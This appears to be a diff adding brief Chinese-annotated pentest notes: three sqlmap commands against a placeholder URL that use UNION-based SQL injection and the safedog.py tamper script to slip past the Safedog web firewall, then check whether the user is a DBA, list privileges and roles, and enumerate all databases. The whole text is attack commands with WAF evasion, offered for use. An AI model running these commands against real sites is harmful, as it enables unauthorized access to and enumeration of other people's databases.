@@ -1,0 +1,5 @@
+sudo sqlmap -u "http:\\ip\目录\?id=2" --technique=U --tamper=safedog.py --is-dba当前用户权限（是否为root权限）
+
+sudo sqlmap -u "http:\\ip\目录\?id=2" --technique=U --tamper=safedog.py --privileges(查看用户数据库有关增删改查的权限)
+
+sudo sqlmap -u "http:\\ip\目录\?id=2" --technique=U --tamper=safedog.py -roles (枚举数据库管理系统用户的角色) --dbs(查看所有数据库)
